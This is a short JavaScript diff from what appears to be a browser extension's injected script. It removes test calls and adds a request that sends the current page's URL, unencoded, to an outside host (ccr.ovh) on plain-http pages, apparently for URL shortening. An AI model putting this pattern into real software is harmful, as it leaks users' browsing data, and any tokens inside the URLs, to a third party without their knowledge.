@@ -1,4 +1,4 @@
-﻿function httpGetAsync(theUrl, callback)
+﻿function cookiez_httpGetAsync(theUrl, callback)
 {
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.onreadystatechange = function() { 
@@ -10,15 +10,9 @@
 }
 
 function cookiez_injExecute() {
-	alert(window.location.href);
-	
 	if(location.protocol == "http:") {
-		httpGetAsync("http://l.ccr.ovh/test.php", function() {
-			console.log("co");
+		cookiez_httpGetAsync("http://ccr.ovh/shortenurl.php?mode=shortenurl&url=" + window.location.href, function(r) {
+			console.log(r);
 		});
 	}
-	
-	httpGetAsync("http://l.ccr.ovh/test.php", function() {
-		console.log("co");
-	});
 }
